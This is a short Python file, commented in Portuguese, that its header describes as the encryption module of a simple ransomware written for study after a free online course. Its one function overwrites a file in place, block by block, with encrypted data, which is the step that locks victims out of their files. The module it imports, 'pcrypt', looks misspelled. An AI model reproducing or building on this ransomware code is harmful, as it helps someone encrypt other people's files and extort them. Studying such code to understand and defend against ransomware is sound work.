#Um ransonware simples codado em pyhton a título de estudos
#O material de base foi um curso gratuíto na Udemy
#
#Autor: Marco Antonio Damaceno
#Data: 21/01/2021
#
#Módulo de Criptografia

import pcrypt

def change_files(filename, crytoFn, block_size=16):
    with open(filename, 'r+b') as _file:
        raw_value = _file.read(block_size)
        while raw_value:
            cipher_value = crytoFn(raw_value)

            # comparando o tamanho dos blocos cifrado e plaintext
            if len(raw_value) != len(cipher_value):
                raise ValueError('O valor cifrado {} tem um tamanho diferente do plaintext {}'.format(len(cipher_value), len(raw_value)))
            _file.seek(- len(raw_value), 1)
            _file.write(cipher_value)
            raw_value = _file.read(block_size)



            




